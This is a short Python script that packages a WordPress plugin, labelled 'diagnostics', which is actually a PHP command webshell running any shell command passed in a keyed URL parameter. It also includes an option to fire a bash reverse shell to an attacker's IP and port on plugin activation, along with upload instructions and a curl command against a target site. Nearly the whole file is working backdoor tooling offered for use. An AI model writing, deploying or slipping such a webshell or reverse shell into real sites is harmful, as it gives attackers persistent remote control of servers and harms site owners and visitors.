#!/usr/bin/env python3
"""Build a WordPress plugin zip containing a command webshell (for use once
you are administrator: Plugins -> Add New -> Upload Plugin -> Activate).

    python wp_plugin_shell.py                         # -> shell-plugin.zip
    python wp_plugin_shell.py --name diag --key s3cr3t
Then:  curl "http://target/wp-content/plugins/<name>/<name>.php?k=<key>&c=id"
(Optional --revshell IP:PORT: activating the plugin also fires a reverse shell.)
"""
import argparse
import zipfile


def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--name", default="shell-plugin")
    ap.add_argument("--key", default="aev", help="parameter value required to run commands")
    ap.add_argument("--revshell", help="IP:PORT to connect back on activation")
    ap.add_argument("-o", "--out")
    a = ap.parse_args()
    rev = ""
    if a.revshell:
        ip, port = a.revshell.split(":")
        rev = (f"register_activation_hook(__FILE__, function() {{ exec(\"/bin/bash -c 'bash -i >& "
               f"/dev/tcp/{ip}/{port} 0>&1' > /dev/null 2>&1 &\"); }});\n")
    php = f"""<?php
/*
Plugin Name: {a.name}
Description: diagnostics
Version: 1.0
*/
{rev}if (isset($_GET['k']) && $_GET['k'] === '{a.key}' && isset($_GET['c'])) {{
    header('Content-Type: text/plain');
    echo shell_exec($_GET['c'] . ' 2>&1');
    exit;
}}
"""
    out = a.out or f"{a.name}.zip"
    with zipfile.ZipFile(out, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr(f"{a.name}/{a.name}.php", php)
    print(f"[+] wrote {out}")
    print(f"    after activation: /wp-content/plugins/{a.name}/{a.name}.php?k={a.key}&c=id")


if __name__ == "__main__":
    main()
